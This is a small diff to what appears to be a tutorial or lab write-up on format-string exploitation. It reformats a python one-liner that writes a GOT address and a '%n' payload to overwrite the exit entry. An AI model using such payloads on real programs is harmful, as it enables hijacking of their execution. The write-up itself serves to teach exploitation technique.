@@ -92,7 +92,7 @@ For the ```%n``` modifier, we need the number of bytes to write. <br/>
 Here is what our string attack will look like:
 ```
 "exit GOT address" + "134513828 - 4 bytes" + "%4$n"
-python -c 'print "\x38\x98\x04\x08"+"%134513824d%4$n"' 
+python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' 
 ```
 Let's try it out!
 ```
